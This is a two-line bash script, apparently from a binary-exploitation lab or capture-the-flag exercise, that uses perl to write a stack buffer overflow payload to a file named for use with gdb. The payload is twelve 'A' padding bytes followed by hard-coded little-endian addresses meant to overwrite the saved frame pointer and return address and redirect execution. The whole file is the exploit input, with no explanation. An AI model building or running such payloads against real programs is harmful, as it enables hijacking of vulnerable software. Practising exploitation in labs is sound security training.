#!/bin/bash

perl -e 'print "A"x12; print "\x78\xef\xff\xbf\x23\x85\04\x08";' > input.gdb.txt
